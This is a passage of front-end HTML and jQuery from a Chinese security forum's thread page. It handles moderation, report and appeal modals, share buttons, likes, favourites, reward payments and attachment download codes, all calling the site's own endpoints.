		$.confirm(xn.lang('confirm_delete_thread', {n:modtid.length}) + '<br><br>'+radios, function() {
			var tids = xn.implode('_', modtid);
			var type = $('input[name="type"]').checked();
			$.xpost(xn.url('mod-delete-'+tids), {type: type}, function(code, message) {
				if(code != 0) return $.alert(message);
				$.alert(message).delay(1000).location('');
			});
		});
	})

	// 恢复逻辑删除的帖子
	$('body').on('click', '.post_recover', function() {
		var jthis = $(this);
		var href = jthis.data('href');
		var isfirst = jthis.attr('isfirst');
		if(window.confirm('确定恢复删除的帖子？')) {
			$.xpost(href, function(code, message) {
				var isfirst = jthis.attr('isfirst');
				if(code == 0) {
					if(isfirst == '1') {
						$.location('forum-32.htm');
					} else {
						window.location.reload();
					}
				} else {
					$.alert(message);
				}
			});
		}
		return false;
	});

})

</script>

<div class="modal fade appeal" id="appeal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
                <div class="modal-content">
                        <div class="modal-header">
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                <span aria-hidden="true">&times;</span>
                        </button>
                        <h4 class="modal-title" id="exampleModalLabel">求助问答申诉</h4>
                        </div>
                        <form id="form_appeal" action="https://bbs.kanxue.com/post-appeal.htm" method="post">
	                        <div class="modal-body">
	                                <div class="form-group">
	                                	<input id="pid" name="pid" value="0" type="hidden">
	                                        <textarea class="form-control" id="brief" name="brief" rows="6" placeholder="请填写内容，注意: 请写明申诉的原因"></textarea>
	                                </div>
	                        </div>
	                        <div class="modal-footer">
	                                <button id="appeal_submit" type="button" class="btn btn-primary" data-loading-text="正在提交...">申请提交</button>
	                        </div>
	                </form>
                </div>
        </div>
</div><div class="modal fade report" id="report" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
                <div class="modal-content">
                        <div class="modal-header">
                        
                        <h4 class="modal-title" id="exampleModalLabel">举报此帖</h4>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                <span aria-hidden="true">&times;</span>
                        </button>
                        </div>
                        <form id="form_report" action="https://bbs.kanxue.com/post-report.htm" method="post">
                                <div class="modal-body">
                                        <div class="form-group">
                                                <input id="tid" name="tid" value="0" type="hidden">
                                                <input id="pid" name="pid" value="0" type="hidden">
                                                <textarea class="form-control" id="brief" name="brief" rows="6" placeholder="请填写内容，注意: 请确认您所举报此帖的内容涉及到语言挑衅和违犯论坛版规的内容， 版主将收到举报后审核该帖！"></textarea>
                                        </div>
                                </div>
                                <div class="modal-footer">
                                        <button id="report_submit" type="button" class="btn btn-primary" data-loading-text="正在提交...">发送报告</button>
                                </div>
                        </form>
                </div>
        </div>
</div>

<div class="modal fade sqtj" id="sqtj" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
                <div class="modal-content">
                        <div class="modal-header">
                        
                        <h4 class="modal-title" id="exampleModalLabel">申请推荐此帖</h4>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                <span aria-hidden="true">&times;</span>
                        </button>
                        </div>
                        <form id="form_sqtj" action="https://bbs.kanxue.com/post-sqtj.htm" method="post">
                                <div class="modal-body">
                                        <div class="form-group">
                                                <input id="tid" name="tid" value="0" type="hidden">
                                                <input id="pid" name="pid" value="0" type="hidden">
                                                <textarea class="form-control" id="brief" name="brief" rows="6" placeholder="请填写推荐的理由，注意: 请确认您所申请推荐的内容， 版主将收到申请后审核该帖！"></textarea>
                                        </div>
                                </div>
                                <div class="modal-footer">
                                        <button id="sqtj_submit" type="button" class="btn btn-primary" data-loading-text="正在提交...">发送申请</button>
                                </div>
                        </form>
                </div>
        </div>
</div>
<script src="https://bbs.kanxue.com/view/js/group/iconfont.js"></script>
<script src="https://bbs.kanxue.com/view/js/face.js?1.5"></script>
<script src="https://passport.kanxue.com/pc/view/js/qqLevel.js"></script>
<script>
	var thread_uid = '747240';
	var passport_domain = 'passport.kanxue.com';
	// 回复 操作按钮 手机端 显示隐藏方法 开始
	function mobile_more_operate(e) {
		$(".mobile_more_operate").hide();
		$(e.target).siblings(".mobile_more_operate").fadeIn();
	}
	$(document).scroll(function () {
		$(".mobile_more_operate").hide();
	})
	$(document).on("click", function (e) {

		if ($(e.target).parents(".mobile_more_operate_btn").length == 0 && !$(e.target).hasClass(
				'mobile_more_operate_btn')) {
			$(".mobile_more_operate").hide();
		}

	})
	// 回复 操作按钮 手机端 显示隐藏方法 结束

	function show_level(event) {
		var el = event.target;

		var usergid = $(el).attr("data-gid");
		$.tips('<span class="level-' + usergid + ' level"></span>', $(el), {
			tips: [3, '#fff'],
			time: 2000
		});
	}

	function show_online_level(event) {
		var el = event.target;

		var userdesc = $(el).attr("data-desc");

		$.tips('<span class="text-muted">' + userdesc + '</span>', $(el), {
			tips: [3, '#fff'],
			time: 2000
		});
	}

	function online_time_imgs(v) {

		var online_time = $(v).data('online_time');
		var level = qqLevel.getLevel(online_time);
		var imgs = qqLevel.getImg(level, [
			'//' + passport_domain + '/pc/view/img/star_0.gif',
			'//' + passport_domain + '/pc/view/img/star.gif',
			'//' + passport_domain + '/pc/view/img/moon.gif',
			'//' + passport_domain + '/pc/view/img/sun.gif',
			'//' + passport_domain + '/pc/view/img/king.gif',
		]);
		var desc = qqLevel.getDescBbs(online_time);
		$(v).attr('data-desc', desc);

		$(v).next(".post_online_time1").html('( ' + desc + ' )');
		$(v).html(imgs);
	}
	$(".post_online_time").each(function (k, v) {
		online_time_imgs(v)
	})

	// 快速回帖切换到高级回复时，编辑框文字保存一下来
	$('.senior_reply').on('click', function () {
		var quick_reply_message = $('#quick_reply_form').find('#message').val().trim();

		// quick_reply_message = quick_reply_message.replace(/\[em_([0-9]+)\]/g, '<img src="/view/img/face/$1.gif" class="face" style="cursor: pointer;">');

		function senior_reply_pdata(return_obj) {
			if (quick_reply_message.length == 0) {
				$.pdata('quick_reply_message', '');
			} else {
				$.pdata('quick_reply_message', quick_reply_message);
			}
			return return_obj();
		}

		function senior_reply_return() {
			window.location.href = 'post-create-222921.htm';
		};
		senior_reply_pdata(senior_reply_return);

	})


	function shareTo(stype) {
		var ftit = '';
		var flink = '';
		var lk = '';
		//获取文章标题
		ftit = $('.subject').text();
		//获取网页中内容的第一张图片
		flink = $('.message img').eq(0).attr('src');

		if (typeof flink == 'undefined') {
			flink = '';
		}
		//当内容中没有图片时，设置分享图片为网站logo
		if (flink == '') {
			lk = 'http://bbs.kanxue.com/plugin/kanxue/img/kanxuelogo.png';
		}
		//如果是上传的图片则进行绝对路径拼接
		if (flink.indexOf('upload/') != -1) {
			lk = 'http://bbs.kanxue.com/' + flink;
		}
		//qq空间接口的传参
		// if(stype=='qzone'){
		//弹出窗口的宽度;
		// var iw=800; 
		//弹出窗口的高度;
		// var ih=500; 
		//获得窗口的垂直位置;
		// var it = (window.screen.availHeight-30-ih)/4; 
		//获得窗口的水平位置;
		// 	var il = (window.screen.availWidth-10-iw)/4; 
		// 	var openurl = 'https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url='+document.location.href+'?sharesource=qzone&title='+ftit+'&pics='+lk+'&summary='+document.querySelector('meta[name="description"]').getAttribute('content');
		// 	window.open(openurl,"","height="+ih+", width="+iw+", top="+it+", left="+il);
		// }

		//新浪微博接口的传参
		if (stype == 'sina') {
			var iw = 500; //弹出窗口的宽度;
			var ih = 500; //弹出窗口的高度;
			var it = (window.screen.availHeight - 30 - ih) / 4; //获得窗口的垂直位置;
			var il = (window.screen.availWidth - 10 - iw) / 4; //获得窗口的水平位置;
			var openurl = 'http://service.weibo.com/share/share.php?url=' + document.location.href +
				'?sharesource=weibo&title=' + ftit + '&pic=' + lk;
			window.open(openurl, "", "height=" + ih + ", width=" + iw + ", top=" + it + ", left=" + il);

		}
		//qq好友接口的传参
		if (stype == 'qq') {
			var iw = 800; //弹出窗口的宽度;
			var ih = 500; //弹出窗口的高度;
			var it = (window.screen.availHeight - 30 - ih) / 4; //获得窗口的垂直位置;
			var il = (window.screen.availWidth - 10 - iw) / 4; //获得窗口的水平位置;
			var openurl = 'http://connect.qq.com/widget/shareqq/index.html?url=' + document.location.href +
				'?sharesource=qzone&title=' + ftit + '&pics=' + lk + '&summary=' + document.querySelector(
					'meta[name="description"]').getAttribute('content') + '&desc=看雪学院，一个有情怀的安全开发者交流的网站'
			window.open(openurl, "", "height=" + ih + ", width=" + iw + ", top=" + it + ", left=" + il);
		}
		//生成二维码给微信扫描分享，php生成，也可以用jquery.qrcode.js插件实现二维码生成
		if (stype == 'wechat') {

			$.tips('<img width="150" src="bbs_qrcode-http_3A_2F_2Fbbs_2epediy_2ecom_2Fthread_2d222921_2ehtm.htm">', $("#wxshare"), {
				tips: [2, '#eee'],
				time: 5000
			});
		}
	}
	$(function () {
		var jform = $('#quick_reply_form');
		var jsubmit = $('#submit');
		jform.on('submit', function () {
			jform.reset();
			jsubmit.button('loading');
			var postdata = jform.serialize();
			$.xpost(jform.attr('action'), postdata, function (code, message) {
				if (code == 0) {
					var s = '<table>' + message + '</table>';
					var jtr = $(s).find('tr');
					jtr.insertBefore($('table.postlist tr').last());
					jsubmit.button('reset');
					$('#message').val('');

					// 楼层 +1
					var jfloor = jform.find('.floor');
					jfloor.html(xn.intval(jfloor.html()) + 1);

					// 回复数 +1
					var jposts = $('.posts');
					jposts.html(xn.intval(jposts.html()) + 1);

				} else if (code < 0) {
					$.alert(message);
					jsubmit.button('reset');
				} else {
					jform.find('[name="' + code + '"]').alert(message).focus();
					jsubmit.button('reset');
				}
			});
			return false;
		});

		//  显示隐藏 点赞收藏等功能
		var offset_top = $("#collection_thumb").offset().top - $(document).scrollTop();
		if (offset_top < document.documentElement.clientHeight) {
			$(".collection_thumb_left").hide();
		} else {
			$(".collection_thumb_left").show();
		}
		$(document).on("scroll", function () {
			var offset_top = $("#collection_thumb").offset().top - $(document).scrollTop();
			if (offset_top < document.documentElement.clientHeight) {
				$(".collection_thumb_left").hide();
			} else {
				$(".collection_thumb_left").show();
			}
		})
		//收藏功能
		var jfavorite = $('.favorite');
		var jlikesFirst = $('.likes:first');
		var jlikes = $('.likes');
		var jlikes_box = $('.likes_box');
		var likenums = jlikesFirst.text();
		if (parseInt(likenums) > 0) jlikes_box.removeClass("likes_box_hide").addClass("likes_box_show");
		jfavorite.on('click', function () {
			var likenum = jlikesFirst.text();
			likenum_plus = parseInt(likenum) + 1;
			likenum_sub = parseInt(likenum) - 1;
			if (likenum_sub < 0) likenum_sub = 0;
			$.xpost('thread-favorite-222921.htm', function (code, message) {
				if (code == 0) {
					var s = '<i class="icon-star" style="color: #0099ee;"></i>';
					jfavorite.html(s);
					jfavorite.css("border-color", '#0099ee');
					jlikes.text(likenum_plus);
					jlikes_box.removeClass("likes_box_hide").addClass("likes_box_show");

				} else if (code == 1) {
					var s = '<i class="icon-star-o color4A4A4A"></i>';
					jfavorite.html(s);
					jfavorite.css("border-color", '#DDDDDD');
					jlikes.text(likenum_sub);
					if (likenum_sub == 0) jlikes_box.removeClass("likes_box_show").addClass(
						"likes_box_hide");
				} else {
					$.alert(message);
				}
			});
			return false;
		});

		// 点赞
		var page = '1';
		var thumbs_num_box = $('.thumbs_num_box');
		var thumbs_num_first = $(".thumbs_num:first").text();
		if (parseInt(thumbs_num_first) == 0) thumbs_num_box.hide();

		$('.thumb').click(function () {
			var threadid = `222921`;
			var type = 1;
			var num = parseInt(thumbs_num_first);
			var postdata = 'threadid=' + threadid + '&type=1&page=' + page;
			var that = this;
			$.xpost('thumbs_up-thumbs.htm', postdata, function (code, message) {
				if (code == 0) {
					thumbs_num_box.show();
					var s = '<i class="icon-thumbs-up" style="color: #0099ee;"></i>';
					$(that).html(s);
					$(that).css("border-color", '#0099ee');
					$('.thumbs_num').text(num + 1);
					$.tips('感谢您的赏识！您已向主题帖作者发送 ' + message + ' 个雪币，表达感谢', $(that), {
						tips: 1,
						time: 2000,
						tips: [1, '#748691']
					});
				} else if (code == 1) {
					thumbs_num_box.show();
					$.tips(message, $(that), {
						tips: 1,
						time: 2000,
						tips: [1, '#748691']

					});
				} else {
					$.tips(message, $(that), {
						tips: 1,
						time: 2000,
						tips: [1, '#748691']

					});
				}
			})
		})

		// 缩放图片，适应屏幕大小。
		function resize_image() {
			var jmessagelist = $('div.message');
			var first_width = jmessagelist.width(); // 815 : 746; //  734 746
			jmessagelist.each(function () {
				var jdiv = $(this);
				var maxwidth = jdiv.attr('isfirst') ? first_width : first_width - 79; //  734 746
				var jmessage_width = Math.min(jdiv.width(), maxwidth);
				jdiv.find('img, embed, iframe').each(function () {
					var jimg = $(this);
					//if(jimg.width() < 500) return;
					var img_width = this.org_width;
					var img_height = this.org_height;
					if (!img_width) {
						var img_width = jimg.width();
						var img_height = jimg.height();
						this.org_width = img_width;
						this.org_height = img_height;
					}
					//var percent = xn.min(100, xn.ceil((img_width / jmessage_width) * 100));
					if (img_width > jmessage_width) {
						if (this.tagName == 'IMG') {
							jimg.width(jmessage_width);
							jimg.css('height', 'auto');
						} else {
							jimg.width(jmessage_width);
							var height = (img_height / img_width) * jimg.width();
							jimg.height(height);
						}
					}

				});

				jdiv.find('p').each(function () {
					var jp = $(this);
					if ($.trim(jp.text()) == '') {
						jp.css('line-height', '1');
					}
				});
			});
		}
		// resize_image();
		// $(window).on('resize', resize_image);


		//---------by wang start------------------------//
		//取出tr的pid，赋值给tr使name为point_pid
		// $(".post").each(function() {
		// 	var cpid = $(this).attr("pid");
		// 	$(this).attr("id","point_"+ cpid);
		// });
		var url = window.location.toString();

		if (url.indexOf("#") != -1) {
			var cpid = url.split("#")[1];
			if (cpid) {
				$(".post").each(function (k, v) {
					if ($(v).attr("pid") == cpid) {
						var t = $(this).offset() ? $(this).offset().top : 0;
						//$("#frame_right").scrollTop(t);
						$("html,body").animate({
							scrollTop: t
						}, 800)
					}

				});

			}
		}

		//------------by wang end----------------------------//



		// 输入框自动伸缩
		var jmessage = $('#message');
		jmessage.on('focus', function () {
			if (jmessage.t) {
				clearTimeout(jmessage.t);
				jmessage.t = null;
			}
			jmessage.css('height', '6rem');
		});
		jmessage.on('blur', function () {
			jmessage.t = setTimeout(function () {
				jmessage.css('height', '2.5rem');
			}, 1000);
		});

		$('#nav_pc li[fid="32"]').addClass('active');
		$('#nav_mobile li[fid="32"]').addClass('active');

		$(function () {
			$('.emotion').qqFace({
				id: 'facebox',
				assign: 'message',
				path: 'view/img/face/'
			});
		});

		$("div.message img").css("cursor", "pointer");
		$("div.message img").on("click", function () {
			if (window.innerWidth > 768) {
				var img_src = $(this).attr("src");
				var img = new Image();
				img.src = img_src;
				img.onload = function () {
					window.open(img_src);
				};
				// img.onerror = function () {
				// 	alert("error!")
				// };  

			}
		})
		setTimeout(function () {
			$("div.message img").each(function (index, element) {
				if ($(element).width() >= 100) {
					$(element).addClass("div_message_boxShadow");
				}
			})
		}, 2000);

		function IsPC() {
			var userAgentInfo = navigator.userAgent;
			var Agents = ["Android", "iPhone", "SymbianOS", "Windows Phone", "iPad", "iPod"];
			var flag = true;
			for (var v = 0; v < Agents.length; v++) {
				if (userAgentInfo.indexOf(Agents[v]) > 0) {
					flag = false;
					break;
				}
			}
			return flag;
		}

		// 弹出分享页面
		var outside = true;
		$(".bbsshare_btn").on('click', function (event) {
			outside = false;
			$(".bbsshare_modal").show();
		});
		document.body.addEventListener('click', function () {
			outside = true;
		}, true)
		document.body.addEventListener('click', function () {
			if (outside) {
				$(".bbsshare_modal").hide();
			}
		})
		// $(".bbsshare_btn").on('click', function(event){
		// 	$.open({
		// 		type: 1,
		// 		title: false,
		// 		content: $('.bd-bbsshare-modal-sm'),
		// 		offset: 'auto',
		// 		shadeClose: false,
		// 		shade: false,

		// 	});

		// });

		if ($.pdata('collapse_reward') && $.pdata('collapse_reward') == 1) {
			$("#collapse_reward").removeClass('show');
			$(".collapse_btn").find("span").html("展开");
			$(".collapse_btn").find("i").removeClass("icon-angle-up").addClass("icon-angle-down");

		} else if ($.pdata('collapse_reward') == 0 || $.pdata('collapse_reward') == '' || $.pdata(
				'collapse_reward') == null) {
			$("#collapse_reward").addClass('show');
			$(".collapse_btn").find("span").html("收起");
			$(".collapse_btn").find("i").removeClass("icon-angle-down").addClass("icon-angle-up");
		}
		$("#collapse_reward").on('hide.bs.collapse', function () {
			$.pdata('collapse_reward', 1)
			$(".collapse_btn").find("span").html("展开");
			$(".collapse_btn").find("i").removeClass("icon-angle-up").addClass("icon-angle-down");


		})
		$("#collapse_reward").on('show.bs.collapse', function () {
			$.pdata('collapse_reward', 0)
			$(".collapse_btn").find("span").html("收起");
			$(".collapse_btn").find("i").removeClass("icon-angle-down").addClass("icon-angle-up");

		})


		// $(".follow_btn_svg").on("click", function(){
		// 	var that = $(this);
		// 	$.xpost("user-follow.htm", {followed_uid: thread_uid}, function(code, message) {
		// 		if (code == 0) {
		// 			$.msg(message);
		// 			that.parent(".follow_btn_span").remove();
		// 		} else if (code == 1) {
		// 			$.msg(message);
		// 		}
		// 	})
		// })

		$(".follow_btn").on("click", function () {
			var that = $(this);
			var cuid = that.attr("data-cuid");
			$.xpost("user-follow.htm", {
				followed_uid: cuid
			}, function (code, message) {
				if (code == 0) {
					that.removeClass("btn-0099ee").addClass("btn-followed");
					that.html('已关注');
					$.msg(message);
				} else if (code == 1) {
					that.removeClass("btn-followed").addClass("btn-0099ee");
					that.html('<i class="icon icon-plus"></i> 关注');
					$.msg(message);
				} else if (code == -1) {
					$.msg(message);
				}
			})
		})
		$(".avatar_hover").on("mouseenter", function () {
			$(".thread-poptip-box").hide();
			$(this).find(".thread-poptip-box").show();
		})
		$(".avatar_hover").on("mouseleave", function () {
			$(".thread-poptip-box").hide();
		})

		// 右侧块 滚动到一定位置隐藏 开始

		var message_height = 0;
		console.log($('.left_content').height())
		console.log($('.right_content.positionSticky').height())
		
		var rightConHeight = $('.right_content.positionSticky').height();
		$(window).scroll(function () {
			var leftConHeight = $('.left_content').height();
			var message_height2 = $(".message_card .message").height();

			if (message_height2 != message_height) {
				message_height = message_height2;
			}
			if(leftConHeight > rightConHeight) {
				if (window.pageYOffset > message_height) {
					$(".rightbox_card_hidden").hide();
				} else {
					$(".rightbox_card_hidden").show();
				}
			}
			
		});
		// 右侧块 滚动到一定位置隐藏 结束
		//广告

		function ad_count_request(data, type, adkey, num, func) {
			return false;
			$.xpost('//www.kanxue.com/advertisement-request.htm', "data=" + data + "&type=" + type +
				"&adkey=" + adkey + "&num=" + num,
				function (code, message) {
					if (func) func();
				})
		}
		var adpostdata = $("#thread_ad").data('thread_postdata');
		var adkey = "pcKzAEc1VHsVIGSNojSPBg_3D_3D";
		ad_count_request(adpostdata, 1, adkey, 1);
		$("#thread_ad").click(function () {
			var that = $(this);
			var href = $(this).data('href');
			ad_count_request(adpostdata, 2, adkey, 0, function () {
				$(that).attr('target', "_blank");
				$(that).attr('href', href);

			});

		});




		$(".fieldset .attachlist a.attach_li").on("click", function () {
			var _this = this;
			if ($(".down_golds").length > 0) {
				$.confirm($(".down_golds").text(), function () {
					window.open($(_this).attr("data-href"));
				})
			} else {
							}
		})

	});
</script>

<div style="position: absolute;top: 50%;left: 50%;transform: translateX(-50%) translateY(-50%);" class="modal fade bd-example-modal-sm" id="wxpay_modal"  tabindex="-1" role="dialog" aria-labelledby="mySmallModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-sm">

    <div class="modal-content text-center ">
        <div class="" style="height: 55px; border-bottom: 1px solid rgba(204, 204, 204, 0.26); background-image: url(https://bbs.kanxue.com/view/img/pay_s.png); background-repeat: no-repeat; background-position: bottom center;">
            <button type="button" class="close mr-3" style="margin-top: 1.5rem;" data-dismiss="modal" aria-label="Close">
                <span aria-hidden="true">&times;</span>
                <span class="sr-only">Close</span>
            </button>
        </div>
        <div class="wxpay_modal_body">

        </div>
    </div>
</div>
</div>
<script>
var jpay_form = $('#pay_kx');
var jkxpay = $('.kx-pay');
var rid = 0;
var check_handle = null;

function topay(){
    clearInterval(check_handle);
    check_handle = null;
    var valtype = $("input[name='reward_type']:checked").val();
    var rmbstype = $("input[name='reward_rmbs']:checked").val();
    if(!valtype) { alert('请您选择一个支付方式!'); return false; }
    if(rmbstype < 1) {
        alert("打赏金额不能少于1雪花");
        return false;
    }else if(valtype == 1){
        if(_is_weixin) {
            $.alert('请用其它浏览器打开再用赞赏功能!');
            return false;
        }

        window.Popup = window.open('about:blank', '_blank','width='+window.screen.width+',height='+window.screen.height+', ...');
        var ptdata = jpay_form.serialize();
        jkxpay.button('loading');
        $.xpost('reward_pay-charge.htm', ptdata, function(code, message) {
            if(code == 0) {
                
                Popup.blur();
                Popup.opener.focus();
                Popup.location = 'reward_pay-reward_alipay-'+ message +'.htm';
                jkxpay.button('reset');
                $('.reward').modal('hide');
                check_setInterval(message);
            } else if(code < 0) {
                Popup.close();
                alert(message);
                jkxpay.button('reset');
            } else {
                Popup.close();
                alert(message);
                jkxpay.button('reset');
            }
        });
        return false;
    }else if(valtype == 2){
        var postdata = jpay_form.serialize();
        jkxpay.button('loading');
        $.xpost('reward_pay-reward_remainder.htm', postdata, function(code, message) {
            if(code == 0) {
                $.alert(message);
                jkxpay.button('reset');
                $('.reward').modal('hide');
                window.location.reload();
            } else if(code < 0) {
               $.alert(message);
                jkxpay.button('reset');
            } else {
                $.alert(message);
                jkxpay.button('reset');
            }
        });
        return false;
    }else if(valtype == 3) {

        // $('#wxpay_modal').modal({backdrop: 'static', keyboard: false});
        var ptdata = jpay_form.serialize();
        jkxpay.button('loading');
        $.xpost('reward_pay-charge.htm', ptdata, function(code, message) {
            if(code == 0) {
                //微信支付
                $.xget('reward_pay-wxpay-'+ message +'.htm',function(cd,msg) {
                    if(cd == 0) {
                        check_setInterval(message);

                        //$(".wxpay_code img").attr('src', 'http://paysdk.weixin.qq.com/example/qrcode.php?data='+ msg);
                        var wx_img = '<div class="pt-3 text-center"><img src="./view/img/wxpay2.png" style="height: 40px;"></div>\
                        <div class="modal-body wxpay_code pt-3 pb-3">\
                            <div  style="width: 80%;text-align:center; margin: 0 auto;">\
                                <span class="wx_img"><img alt="扫码支付" style="width: 60%;" src="//bbs.kanxue.com/reward_pay-wxcode-'+ xn.urlencode(msg) +'.htm"/></span>\
                                <span class="pay_success_shadow" style="display: none;"></span>\
                            </div>\
                            <div class="text-center text-muted mt-3">打开微信扫一扫，即可完成支付</div>\
                            <div class="swal2-icon swal2-success swal2-animate-success-icon">\
                                <span class="swal2-success-line-tip "></span>\
                                <span class="swal2-success-line-long "></span></div></div>';  
                        $(".wxpay_modal_body").html(wx_img);
                        jkxpay.button('reset');
                        $(".reward").modal('hide');
                        $('#wxpay_modal').modal({backdrop: 'static', keyboard: false});
                        $('#wxpay_modal').modal('show');
                    } else {
                        $.alert(msg);
                        jkxpay.button('reset');
                    }
                })
                return false;
            } else {
                $.alert(message);
                jkxpay.button('reset');
            }
        });
      
        return false;

    }else{
        $('.reward').modal('hide');
        return false;
    }
}

function check_status(rid) {
  var val_type = $("input[name='reward_type']:checked").val();
  $.xpost('reward_pay-check.htm', {checkid: rid}, function(code, message) {
    if(code == 0) {
      if(val_type == 1) {
        Popup.close();
      }
      $.alert('恭喜您，赞赏成功！');
      setTimeout(function() {
                 window.location.reload();
      }, 3000);
      // if(check_handle) {
        clearInterval(check_handle);
        check_handle = null;
      // }
    } else {
      return false;
    }
  });
}

function check_setInterval(rid) {
  check_handle = setInterval(function() {
    check_status(rid);
  }, 3000);
}

window._is_weixin = function() {
  var _ua = window.navigator.userAgent.toLowerCase();
  if (_ua.match(/MicroMessenger/i) == 'micromessenger') {
      return true;
  } else {
      return false;
  }
}()


$("select.reward_reason").change(function(){

    console.log( $("select.reward_reason option:selected").val());
    var reward_reason = $("select.reward_reason option:selected").val()
    if (reward_reason != 0) {
        $(".reward_reason_textarea").val($("select.reward_reason option:selected").val());
    }
    
    
})

</script><script>
var jform_appeal = $('#form_appeal');
var appeal_submit = $('#appeal_submit');

appeal_submit.on('click', function() {
    jform_appeal.reset();
    appeal_submit.button('loading');
    var postdata = jform_appeal.serialize();
    
    $.xpost(jform_appeal.attr('action'), postdata, function(code, message) {
        if(code == 0) {
       	$.alert(message);
       	appeal_submit.button('reset');
       	setTimeout(function(){window.location.reload();
            }, 2000);
        } else {
    	$.alert(message);
    	appeal_submit.button('reset');
        }
    });
    return false;
});

 $('#appeal').on('show.bs.modal', function (event) {
	var button = $(event.relatedTarget)
	var pid = button.data('pid');
	var modal = $(this);
	modal.find('.modal-body #pid').val(pid);

})
</script><script>

var jform_report = $('#form_report');
var report_submit = $('#report_submit');

report_submit.on('click', function() {
    jform_report.reset();
    report_submit.button('loading');
    var postdata = jform_report.serialize();
    
    $.xpost(jform_report.attr('action'), postdata, function(code, message) {
        if(code == 0) {
       	$.alert(message);
       	report_submit.button('reset');
       	setTimeout(function(){window.location.reload();
            }, 1000);
        } else {
    	$.alert(message);
    	report_submit.button('reset');
        }
    });
    return false;
});

$('#report').on('show.bs.modal', function (event) {
	var button = $(event.relatedTarget)
    var tid = button.data('tid');
    var pid = button.data('pid');
    var modal = $(this);

    modal.find('.modal-body #tid').val(tid);
    modal.find('.modal-body #pid').val(pid);
})

var jform_sqtj = $('#form_sqtj');
var sqtj_submit = $('#sqtj_submit');

sqtj_submit.on('click', function() {
    jform_sqtj.reset();
    sqtj_submit.button('loading');
    var postdata = jform_sqtj.serialize();
    
    $.xpost(jform_sqtj.attr('action'), postdata, function(code, message) {
        if(code == 0) {
        $.alert(message);
        sqtj_submit.button('reset');
        setTimeout(function(){window.location.reload();
            }, 1000);
        } else {
        $.alert(message);
        sqtj_submit.button('reset');
        }
    });
    return false;
});

$('#sqtj').on('show.bs.modal', function (event) {
    var button = $(event.relatedTarget)
    var tid = button.data('tid');
    var pid = button.data('pid');
    var modal = $(this);

    modal.find('.modal-body #tid').val(tid);
    modal.find('.modal-body #pid').val(pid);
})
</script><!--游客下载附件关注微信公众号-->
<div class="modal fade download_code" id="download_code" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-sm" role="document">
                <div class="modal-content">
                        <div class="modal-header">
                        <h5 class="modal-title" id="exampleModalLabel">游客下载提示</h5>
	                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
	                                <span aria-hidden="true">&times;</span>
	                        </button>
	                        
                        </div>
                        <form id="form_download" action="" method="post" target="_blank">
                                <div class="modal-body text-center">
                                    <input id="aid" name="aid" value="0" type="hidden">
                                    <dl class="row">
                                    	<dd class="text-left" style="width:50%">
                                        	<div style="font-size:14px">
                                        		<div>1.请先关注公众号。</div>
                                        		<div>2.点击菜单"更多"。</div>
                                        		<div>3.选择获取下载码。</div>
                                        	</div>
                                    	</dd>
                                    	<dt><img src="https://bbs.kanxue.com/view/img/wxgz.jpg" width="80%"></dt>
                                    </dl>
                                    <fieldset class="form-group">
                						<input class="form-control" type="text" id="download_code" name="download_code" placeholder="请输入下载码" value="" />
                					</fieldset>
                                </div>
                                <div class="modal-footer">
                                        <button id="download_submit" type="button" class="btn btn-primary" data-loading-text="正在提交...">下载</button>
                                </div>
                        </form>
                </div>
        </div>
</div>
<script>

var jform_download = $('#form_download');
var jdownload_submit = $('#download_submit');

    jdownload_submit.on('click', function() {
        jform_download.reset();
        jdownload_submit.button('loading');
        var postdata = jform_download.serialize();

        var aid2 = jform_download.find('.modal-body #aid').val();
        
        $.xpost(jform_download.attr('action'), postdata, function(code, message) {
            if(code == 0) {
    	       	jdownload_submit.button('下载中...');
    	       	var href = "attach-download-"+aid2+"-"+message+".htm";
    		window.location = href;
    		setTimeout(function() {
                        jdownload_submit.button('reset');
                        jform_download.find('.modal-body #download_code').val('');
                    }, 1500);
    		
            } else {
    	    	$.alert(message);
    	    	jdownload_submit.button('reset');
            }
        });
        return false;
    });

    $('#download_code').on('show.bs.modal', function (event) {
        var button = $(event.relatedTarget)
        var aid = button.data('aid');
        var modal = $(this);
        var down_action="attach-download_code-"+aid+".htm";

        modal.find('.modal-body #aid').val(aid);
        modal.find('#form_download').attr('action', down_action);
    })
</script><script>
var page = '1';
$('#thumb').click(function() {
	var threadid = '222921';
	var type = 1;
	var num = parseInt($('#thread_thumb_num').text());
	var postdata = 'threadid=' + threadid + '&type=1&page='+page;
	var that = this;
	$.xpost('thumbs_up-thumbs.htm', postdata, function(code, message) {
		if(code == 0) {
			var s = '<i class="icon-thumbs-o-up" style="color: #0099ee;"></i>&nbsp;<span style="color: #0099ee;">已赞</span>';
			$('#thumb').children('a').html(s);
			$('#thread_thumb_num').text(num + 1);
			$.tips('感谢您的赏识！您已向主题帖作者发送 '+message+' 个雪币，表达感谢', $(that), {
				tips:1,
				time: 2000,
				tips: [1,'#748691']

			});
		} else {
			$.tips(message, $(that), {
				tips: 1,
				time: 2000,
				tips: [1,'#748691']

			});
		}
	})
})
</script>

<script>
$(document).on('click','.reply_thumb',function(){
	
	var index = $('.reply_thumb').index(this);
	var threadid = $(this).find('input').eq(0).val();
	var praised_uid = $(this).find('input').eq(1).val();
	var pid = $(this).find('input').eq(2).val();
	var num = parseInt($('.thumb_num').eq(index).text());
	
	var postdata = 'threadid=' + threadid + '&praised_uid=' + praised_uid +'&pid=' + pid + '&type=2&page='+page;
	var that = this;
	$.xpost('thumbs_up-thumbs.htm', postdata, function(code, message) {
    	if(code == 0) {
            var s = '<i class="icon-thumbs-o-up" style="color: #0099ee;"></i>';
            var new_num = num + 1;
            $('.reply_thumb').eq(index).children('a').html(s);
	    $('.thumb_num').eq(index).text(num + 1);
	    	$.tips('英雄所见略同！您已向该回帖发送  '+message+' 个雪币，表达感谢', $(that), {
			tips: [1,'#748691'],
			time: 4000,
			
		});
